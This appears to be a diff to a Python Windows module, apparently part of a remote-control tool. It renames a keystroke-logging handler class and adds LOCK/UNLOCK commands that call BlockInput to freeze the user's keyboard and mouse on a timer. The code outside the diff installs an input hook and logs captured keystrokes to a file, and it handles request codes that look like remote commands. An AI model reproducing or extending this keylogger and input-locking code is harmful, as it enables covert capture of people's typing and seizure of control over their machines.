@@ -2,7 +2,7 @@ import ctypes
 from ctypes import windll, byref, c_int, c_void_p, POINTER, CFUNCTYPE
 from ctypes import wintypes
 import threading
-import os
+import time
 from pathlib import Path
 
 from handler_state import HandlerState
@@ -115,7 +115,6 @@ def InstallHookAndLoop(lpParameter):
         windll.user32.DispatchMessage(ctypes.byref(msg))
 
     windll.user32.UnhookWindowsHookEx(hook)
-    print('aa')
     return 200
 
 def StartThread(function):
@@ -128,12 +127,18 @@ def StartThread(function):
 
     return handle, threadID
 
-class KeystrokeHandler:
+def TimedCall(callback, seconds):
+    time.sleep(seconds)
+    callback()
+
+class InputHandler:
     def __init__(self, filepath):
         global globalFile
         self.threadHandle = None
         self.threadID = wintypes.DWORD()
         self.hooked = False
+        self.locked = False
+        self.lockTimerThread = None
         Logger.Init(filepath)
         pass
 
@@ -150,13 +155,20 @@ class KeystrokeHandler:
                 self.Unhook()
             elif reqCode == "CLEAR":
                 Logger.Clear()
+            elif reqCode == "LOCK":
+                if data == "" or data == None:
+                    self.Lock(None)
+                else:
+                    self.Lock(int(data))
+            elif reqCode == "UNLOCK":
+                self.Unlock()
             else:
                 return HandlerState.INVALID, None
 
             return HandlerState.SUCCEEDED, extraData.encode("utf-8")
             pass
         except Exception as e:
-            print(e)
+            raise e
             return HandlerState.FAILED, None
 
     def Hook(self):
@@ -173,16 +185,51 @@ class KeystrokeHandler:
         else:
             raise OSError("Quit message is not posted")
 
+    def Lock(self, duration=10):
+        assert not self.locked, "Input is already locked."
+
+        state = windll.user32.BlockInput(True)
+        print(state)
+        assert state, "Cannot lock input"
+        self.locked = True
+
+        if duration != None:
+            self.lockTimerThread = threading.Thread(target=TimedCall, args=(self.Unlock, duration, ), daemon=True)
+
+        if self.lockTimerThread != None:
+            self.lockTimerThread.start()
+
+    def Unlock(self):
+        assert self.locked, "Input is already unlocked."
+
+        state = windll.user32.BlockInput(False)
+        assert not state, "Cannot unlock input."
+
+        self.locked = False
+        self.lockTimerThread = None
+
     def __del(self):
         self.Unhook()
+        if self.locked:
+            self.Unlock()
         Logger.Del()
         pass
 
+def Func():
+    print(threading.current_thread())
+    time.sleep(3)
+    print("thread ended")
+
 if __name__ == "__main__":
-    from pathlib import Path
-    import os
-    import time
-    a = KeystrokeHandler("temp.txt")
-    handle = StartThread(InstallHookAndLoop)
-    input("b: ")
-    print(Logger.Read())
+    # from pathlib import Path
+    # import os
+    # import time
+    # a = KeystrokeHandler("temp.txt")
+    # handle = StartThread(InstallHookAndLoop)
+    # input("b: ")
+    # print(Logger.Read())
+
+    a = InputHandler("temp.txt")
+
+    a.Execute("LOCK", 2)
+    time.sleep(5)
